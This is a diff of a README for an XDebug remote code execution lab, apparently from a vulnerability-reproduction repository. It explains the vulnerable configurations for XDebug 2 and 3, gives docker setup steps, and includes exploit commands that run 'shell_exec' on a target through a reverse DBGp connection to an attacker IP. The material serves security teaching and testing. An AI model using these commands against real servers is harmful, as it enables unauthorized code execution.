@@ -1,41 +1,66 @@
-# XDebug 远程调试漏洞（代码执行）
+# PHP XDebug Remote Debugging Code Execution
 
-XDebug是PHP的一个扩展，用于调试PHP代码。如果目标开启了远程调试模式，并设置`remote_connect_back = 1`：
+[中文版本(Chinese version)](README.zh-cn.md)
 
-```
+XDebug is a PHP extension used for debugging PHP code. When remote debugging mode is enabled with appropriate settings, an attacker can execute arbitrary PHP code on the target server by exploiting the debug protocol (DBGp).
+
+For XDebug version 2.x, the vulnerability occurs when the following configuration is enabled:
+
+```ini
 xdebug.remote_connect_back = 1
 xdebug.remote_enable = 1
 ```
 
-这个配置下，我们访问`http://target/index.php?XDEBUG_SESSION_START=phpstorm`，目标服务器的XDebug将会连接访问者的IP（或`X-Forwarded-For`头指定的地址）并通过dbgp协议与其通信，我们通过dbgp中提供的eval方法即可在目标服务器上执行任意PHP代码。
+For XDebug version 3.x (which introduced breaking changes in configuration), the equivalent vulnerable configuration is:
 
-更多说明可参考：
-
- - https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface
- - https://xdebug.org
-
-## 测试环境
-
-编译及启动测试环境
-
-```
-docker-compose build
-docker-compose up -d
+```ini
+xdebug.mode = debug
+xdebug.discover_client_host = 1
+xdebug.client_host = 1
 ```
 
-启动完成后，访问`http://your-ip:8080/`即可发现主页是一个简单的phpinfo，在其中可以找到xdebug的配置，可见开启了远程调试。
+When these configurations are enabled, XDebug will attempt to connect back to the attacker's IP through the DBGp protocol when a client visits the appropriate trigger URL. The DBGp protocol provides an `eval` function that can be used to execute arbitrary PHP code.
 
-## 漏洞利用
+References:
 
-因为需要使用dbgp协议与目标服务器通信，所以无法用http协议复现漏洞。
+- <https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface>
+- <https://xdebug.org>
 
-我编写了一个[漏洞复现脚本](exp.py)，指定目标web地址、待执行的php代码即可：
+## Environment Setup
+
+Execute the following command to build and start the vulnerable environment:
 
 ```
-# 要求用python3并安装requests库
-python3 exp.py -t http://127.0.0.1:8080/index.php -c 'shell_exec('id');'
+docker compose up -d
 ```
+
+The environment includes two services:
+
+- PHP 7.1 with XDebug 2.5.5: Accessible at `http://your-ip:8080/`
+- PHP 7.4 with XDebug 3.1.6: Accessible at `http://your-ip:8081/`
+
+After the environment is started, visit each URL to see a simple phpinfo page. You can verify that XDebug is enabled and configured for remote debugging in the PHP configuration section.
+
+## Vulnerability Reproduction
+
+Since the vulnerability requires communication using the DBGp protocol with the target server, it cannot be reproduced using HTTP protocol alone.
+
+A proof-of-concept exploit script [exp.py](exp.py) is provided that can execute arbitrary PHP code on the target server. The script supports both XDebug 2.x (port 9000) and XDebug 3.x (port 9003):
+
+```bash
+# Requires Python 3 and the requests library
+python3 exp.py -t http://[target-ip]:8080/index.php -c 'shell_exec("id");' --dbgp-ip [attacker-ip]
+python3 exp.py -t http://[target-ip]:8081/index.php -c 'shell_exec("id");' --dbgp-ip [attacker-ip]
+```
+
+Successful exploitation will execute the command and return its output:
 
 ![](1.png)
 
-**重要说明：因为该通信是一个反向连接的过程，exp.py启动后其实是会监听本地的9000端口（可通过-l参数指定）并等待XDebug前来连接，所以执行该脚本的服务器必须有外网IP（或者与目标服务器处于同一内网）。**
+### Important Notes
+
+The exploitation process involves a reverse connection:
+
+1. The exploit script listens on port 9000 (XDebug 2.x) and port 9003 (XDebug 3.x), please make sure these ports are not blocked by the firewall
+2. You have to have a public IP address or be in the same network as the target
+3. If your public IP differs from your local machine, use the `--dbgp-ip` parameter to specify the IP address that the target server can reach
